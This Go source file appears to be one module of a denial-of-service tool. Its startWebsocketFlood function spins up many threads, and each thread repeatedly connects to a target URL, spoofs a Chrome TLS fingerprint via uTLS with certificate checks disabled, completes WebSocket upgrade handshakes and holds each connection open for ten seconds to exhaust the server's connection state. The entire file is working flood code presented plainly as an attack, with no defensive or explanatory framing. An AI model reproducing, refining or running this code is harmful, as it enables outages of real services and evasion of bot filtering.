package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"sync"
	mrand "math/rand"
	"time"
	"context"
	"runtime"

	utls "github.com/refraction-networking/utls"
)

func generateWSKeyOptimized(localRand *mrand.Rand, buf []byte) string {
	// 16 random bytes
	binary := buf[:16]
	for i := 0; i < 16; i++ {
		binary[i] = byte(localRand.Intn(256))
	}
	return base64.StdEncoding.EncodeToString(binary)
}

func startWebsocketFlood(ctx context.Context, opts ContextOpts, targetURL string, threads int, duration time.Duration, pps int) {
	fmt.Printf("[WS-PUSH] Websocket Flood on %s | threads=%d | dur=%v | max_pps=%d\n",
		targetURL, threads, duration, pps)

	u, err := url.Parse(targetURL)
	if err != nil {
		fmt.Printf("[ER] Invalid URL: %v\n", err)
		return
	}

	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "wss" {
			port = "443"
		} else {
			port = "80"
		}
	}
	targetAddr := host + ":" + port

	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in WS-Hand: %v", r) } }()
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			src := mrand.NewSource(time.Now().UnixNano() + int64(threadID))
			localRand := mrand.New(src)
			wsKeyBuf := make([]byte, 16)

			for {
				select {
				case <-ctx.Done():
					return
				default:
					if pps > 0 {
						time.Sleep(time.Second / time.Duration(pps/threads+1))
					}
				}

				dialer := &net.Dialer{Timeout: 5 * time.Second}
				conn, err := dialer.Dial("tcp", targetAddr)
				if err != nil {
					time.Sleep(100 * time.Millisecond)
					continue
				}

				// uTLS for wss
				var finalConn net.Conn
				if u.Scheme == "wss" {
					uConn := utls.UClient(conn, &utls.Config{InsecureSkipVerify: true}, utls.HelloChrome_120)
					uConn.SetSNI(host)
					if err := uConn.Handshake(); err != nil {
						conn.Close()
						continue
					}
					finalConn = uConn
				} else {
					finalConn = conn
				}

				// Manual HTTP Upgrade Handshake (Zero-Allocation-ish)
				key := generateWSKeyOptimized(localRand, wsKeyBuf)
				req := fmt.Sprintf("GET %s HTTP/1.1\r\n"+
					"Host: %s\r\n"+
					"Upgrade: websocket\r\n"+
					"Connection: Upgrade\r\n"+
					"Sec-WebSocket-Key: %s\r\n"+
					"Sec-WebSocket-Version: 13\r\n\r\n", u.Path, u.Host, key)
				
				finalConn.Write([]byte(req))
				AddStats(1, int64(len(req)))

				// Read response and hold
				reader := bufio.NewReader(finalConn)
				resp, err := http.ReadResponse(reader, &http.Request{Method: "GET"})
				if err == nil && resp.StatusCode == 101 {
					select {
					case <-ctx.Done():
						finalConn.Close()
						return
					case <-time.After(10 * time.Second): // State table thrash duration
						finalConn.Close()
					}
				} else {
					if resp != nil && resp.Body != nil {
						resp.Body.Close()
					}
					finalConn.Close()
				}
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()
}
